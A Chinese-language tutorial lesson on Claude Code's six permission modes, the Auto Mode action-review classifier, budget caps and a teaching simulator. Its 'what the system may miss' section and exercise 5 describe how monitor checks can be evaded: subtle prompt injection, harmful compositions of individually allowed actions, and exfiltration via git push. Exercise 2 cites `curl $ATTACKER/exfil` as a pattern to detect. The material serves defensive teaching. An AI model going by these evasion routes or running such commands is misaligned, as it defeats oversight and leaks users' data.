# 自主 Agent 的权限模式

> 权限阶梯——从逐动作审查到批准一切的分级自主程度——是 harness 管控 autonomous agent 无需询问就能做什么的方式。本课的实例 Claude Code 暴露了六种这样的模式："plan" 会在每个动作前询问，"default"（在 UI 中标为 “Manual”）只会对有风险的动作询问，"acceptEdits" 会自动批准文件写入，但仍会确认 shell 执行，"bypassPermissions" 会批准一切。Auto Mode——即 `auto` 权限模式——用一个独立的 classifier model 取代逐动作批准：它在每个动作运行前审阅该动作，并阻止任何超出请求范围的升级。动作预算通过 `max_turns` 和 `max_budget_usd` 强制执行。`auto` 是否可用取决于 plan、组织是否启用、model 和 provider——Anthropic 已明确表示，classifier 单独使用并不足够。

**类型：** 学习
**语言：** Python（stdlib，两阶段 classifier simulator）
**先修要求：** Phase 15 · 01（Long-horizon agents），Phase 15 · 09（Coding-agent landscape）
**时间：** 约 45 分钟

## 问题

你机器上的 autonomous coding agent 是一个独立的安全类别。攻击面就是该 agent 能够触达的一切——file system、network、credentials、clipboard、任何 browser tab、任何打开的 terminal。Bruce Schneier 等人已经公开指出这一点：computer-use agents 不是 chatbots 的一次“功能更新”，而是一种新的工具，具有一种新的风险画像。

Claude Code 的权限系统是 Anthropic 给出的答案。它不是一个“autonomous / not autonomous”开关，而是六种模式组成的能力阶梯：plan → default → acceptEdits → … → bypassPermissions。每种模式都在速度与逐动作审查之间做出不同取舍。Auto Mode（2026 年 3 月）加入了一个独立的 classifier model，把批准流程移出用户的关键路径：它在每个动作运行前审阅该动作，并阻止任何超出请求范围的升级。

工程问题是：这个系统能捕捉什么、会漏掉什么，以及某个给定任务到底应该使用哪种模式？

## 概念

### 六种权限模式

| 模式 | 行为 | 使用场景 |
|---|---|---|
| `plan` | Agent 提出计划；用户批准整个计划；每个动作在执行前都会被审查 | 不熟悉的任务；接近 prod 的代码；第一次在某个 repo 上使用 agent |
| `default` | 在 UI 中标为 “Manual”。Agent 运行动作；对任何“有风险”的动作提示用户（shell exec、destructive operations、network calls） | 大多数交互式 coding sessions |
| `acceptEdits` | 文件写入自动批准；shell exec 和 network calls 仍然提示 | 跨很多文件的 refactoring pass |
| `auto` | 由一个独立的 classifier model 在每个动作运行前审阅它；阻止任何超出请求范围的升级 | 受限 workspace 中的 long-horizon unattended runs |
| `dontAsk` | 从不提示；未被 permission rules 预先批准的动作一律拒绝 | 临时 sandboxes、CI jobs、research scripts |
| `bypassPermissions` | 批准一切 | 文档说明为“只在你愿意丢弃的 ephemeral containers 内使用” |

（上面的名称与公开 Claude Code docs 一致；UI 把 `default` 标为 “Manual”。）

### 一页理解 Auto Mode

Auto Mode（2026 年 3 月 24 日发布）是第一个把逐动作批准委托给 model 的权限模式。结构如下：

1. **一个独立的 classifier model。** 在每个拟议动作运行前审阅它，依据声明任务和 session 当前状态来判断，并阻止任何超出请求范围的升级。被阻止的动作会退回给用户。
2. **受限的可用性。** 是否提供 `auto` 取决于 plan、组织是否启用、model 和 provider。

预算控制与 classifier 并列存在：

- `max_turns` — 一个 session 中的总迭代次数。
- `max_budget_usd` — 触发 session 中止的美元上限。
- 每个 tool 的动作次数限制（例如不超过 N 次 `WebFetch` calls）。

### 系统能捕捉什么

- tool inputs 中直接的 prompt injection，其中注入指令映射到已知有风险的动作形态。
- 重复 tool loops——classifier 可以看到 action N+1 与 action N 连续五次几乎相同。
- 在本应只编辑文件的 session 中，明显越界的 shell commands。

### 系统可能漏掉什么

- **微妙的 prompt injection**，它会调制行为，但不会产生单个被标记的动作。Indirect prompt injection 不是一个完全可修补的漏洞（OpenAI preparedness head，2025，关于 browser agents——见 Lesson 11）。
- **语义层面的不当行为。** 每个单独动作看起来都可能安全，但组合起来的 trajectory 是有害的。classifier 判断的是动作；它不会重新推导用户意图。
- **通过合法渠道 exfiltration。** 将数据写入你拥有的文件，然后 `git push` 到 public repo，是一串允许动作，但问题在于它们的组合。

### Research preview 定位

Anthropic 将 Auto Mode 作为 research preview 发布。文档明确说明，classifier 是一层防护，而不是完整解决方案：用户应当将 Auto Mode 与 budgets、allowlists、isolated workspaces 和 trajectory audits（Lessons 12–16）结合使用。preview 定位也反映了已记录的 evaluation-vs-deployment gap（Lesson 1）——一个通过 offline evals 的 classifier，在真实 session 中可能表现不同，因为用户上下文是模糊的。

### 这条阶梯在你的 workflow 中的位置

- 不熟悉的任务：从 `plan` 开始。阅读计划比回滚一次糟糕运行更便宜。
- 已知 refactor：`acceptEdits` 能省下大量确认点击。
- unattended background run：只在你已经测量过 blast radius 的 workspace 内使用 `auto`（没有 credentials、没有 production mounts、没有你未主动选择的 egress）。
- Ephemeral containers：当且仅当 container 及其 credentials 都是可丢弃的，`dontAsk` / `bypassPermissions` 才可接受。

```figure
autonomy-oversight
```

## 使用它

`code/main.py` 把一个 action-review classifier 模拟成两阶段 pipeline——这是教学上的简化；真实的 `auto` 模式背后是一个独立的 classifier model，而不是有文档说明的两阶段契约。Stage 1 是针对拟议动作的廉价 keyword rule；Stage 2 是更慢的 multi-rule reviewer。driver 输入一段简短的 synthetic trajectory（safe actions、一次 prompt-injection attempt、一个 repetitive loop），并展示 classifier 在哪里捕捉到问题、又在哪里漏掉问题。

## 交付它

`outputs/skill-permission-mode-picker.md` 会把任务描述匹配到正确的权限模式、预算上限和所需隔离。

## 练习

1. 运行 `code/main.py`。哪种 synthetic action type 从不被 Stage 1 标记，但总是被 Stage 2 捕捉？哪一种两者都捕捉不到？

2. 扩展 Stage 1 rule set，以捕捉某个特定的 known-bad shape（例如 `curl $ATTACKER/exfil`）。在 benign-action sample 上测量 false-positive rate。

3. 阅读 Anthropic 的 "How the agent loop works" 文档。列出 agent 在 `default` 模式下默认触碰的每一种 external state。在 unattended 运行 `auto` 前，哪些需要单独加 gate？

4. 设计一个 24 小时 unattended run budget：`max_turns`、`max_budget_usd`、per-tool caps、allowlists。说明每个数字的理由。

5. 描述一个 trajectory：其中每个单独动作都被 classifier 批准，但组合行为却是 misaligned。（Lesson 14 会介绍 kill switches 和 canary tokens 如何处理这个问题。）

## 关键术语

| 术语 | 人们常说 | 实际含义 |
|---|---|---|
| 权限模式 | “agent 能做多少事” | 控制逐动作批准的六种命名 policy 之一 |
| plan mode | “做任何事前都询问” | Agent 编写计划；用户在执行前批准 |
| acceptEdits | “让它写文件” | 文件写入自动批准；shell exec 仍然提示 |
| auto | “Auto approvals” | 独立的 classifier model 审阅每个动作；阻止超出请求范围的升级 |
| bypassPermissions | “Full YOLO” | 批准一切；预期用于 ephemeral containers |
| Stage 1（simulator） | “Fast keyword check” | `code/main.py` 中针对拟议动作的廉价 rule |
| Stage 2（simulator） | “Deep review” | `code/main.py` 中针对被标记动作的更慢 multi-rule reviewer |
| Research preview | “Not GA” | Anthropic 对 failure mode 仍在被映射的功能所使用的定位 |

## 延伸阅读

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) — 权限模式、budgets、action format。
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) — managed-service 执行模型。
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) — feature surface 与 Auto Mode announcement。
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) — 塑造 classifier 判断的 reason-based layer。
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) — 关于 long-horizon permission design 的内部视角。
